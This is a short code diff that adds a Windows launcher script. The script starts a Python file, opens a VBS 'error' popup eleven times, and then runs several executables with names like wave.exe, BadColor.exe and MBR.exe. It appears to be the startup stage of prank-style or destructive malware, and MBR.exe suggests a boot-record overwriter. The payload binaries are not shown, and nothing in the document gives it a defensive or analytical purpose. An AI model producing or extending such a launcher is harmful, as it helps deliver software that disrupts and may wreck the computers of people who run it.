@@ -1,0 +1,17 @@
+start ketassiumwin.py
+start ketassiumerror.vbs
+start ketassiumerror.vbs
+start ketassiumerror.vbs
+start ketassiumerror.vbs
+start ketassiumerror.vbs
+start ketassiumerror.vbs
+start ketassiumerror.vbs
+start ketassiumerror.vbs
+start ketassiumerror.vbs
+start ketassiumerror.vbs
+start ketassiumerror.vbs
+start mlt.exe
+start wave.exe
+start patshake.exe
+start BadColor.exe
+start MBR.exe
